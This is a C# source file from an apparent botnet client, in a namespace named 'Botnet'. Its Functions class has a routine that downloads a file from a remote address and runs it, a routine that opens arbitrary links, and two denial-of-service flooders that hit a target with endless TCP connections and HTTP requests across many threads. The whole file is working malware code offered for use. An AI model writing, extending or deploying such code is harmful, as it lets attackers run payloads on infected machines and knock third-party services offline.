using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Botnet
{
    class Functions
    {
        public static void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                
                    Thread thr = new Thread(() => { Process.Start(URI); });
                    thr.Start();
                
            }
        }

        public static void Download(string URI)
        {
         
                Thread thr = new Thread(() => 
                {
                    string file_path = web.DownloadFile(URI);
                    Process.Start(file_path);
                });
            thr.Start();
            
        }

        public static void DDOS(string url)
        {
            IPAddress ipAddress = Dns.GetHostEntry(url).AddressList[0];
            Console.WriteLine(ipAddress);
            for (int i=0; i< configs.threads; i++)
                {
                    new Thread( () =>
                    {
                        Thread.CurrentThread.IsBackground = true;

                        while (true)
                        {
                            try
                            {
                                TcpClient client = new TcpClient();
                                client.Connect(url, configs.port);
                                StreamWriter stream = new StreamWriter(client.GetStream());
                                stream.Write("GET /?QssmGrKb=QVXXBekCC&QBo0Rj=f5xQ3cO0dO1RS&ojJyAyIJ=J1mel&KtgP1P8VMd=BLpo8I7qmNbyqbnR1OKsdsdsds HTTP/1.0");// send packet
                                Console.WriteLine("packet sending");
                                stream.Flush();
                                stream.Close();

                            }
                            catch
                            {
                                Console.WriteLine("Error or server is down");

                            }
                        }

                    }).Start();

                    while (true) ;
                
            }

        }

        public static  void Httprequest(string url)
        {
          
            for (int i = 0; i < configs.threads; i++)
            {
                new Thread(async () =>
                {
                    Console.WriteLine("Thred:" + i + "   " );
                    Thread.CurrentThread.IsBackground = true;

                    while (true)
                    {
                        try
                        {
                            HttpClient client = new HttpClient();
                            var result = await client.GetAsync(url).ConfigureAwait(false);
                            Console.WriteLine("code" + result.StatusCode);

                        }
                        catch
                        {
                            Console.WriteLine("Error or server is down");

                        }
                    }

                }).Start();

              

            }

        }

    }
}

